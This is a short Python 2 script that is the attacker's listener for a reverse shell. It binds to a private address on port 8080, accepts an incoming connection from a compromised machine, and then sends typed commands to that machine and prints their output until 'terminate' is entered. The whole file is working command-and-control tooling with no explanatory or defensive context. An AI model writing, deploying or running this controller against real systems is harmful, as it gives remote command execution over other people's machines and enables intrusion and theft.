import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.111", 8080))
    s.listen(1)

    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+] we got a connection from: ', addr)

    while True:
	command = raw_input('Shell~ $ ')
	if 'terminate' in command:
		conn.send('terminate')
		conn.close()
		break
	else:
		conn.send(command)
		print conn.recv(1024)

def main():
    connect()
main()
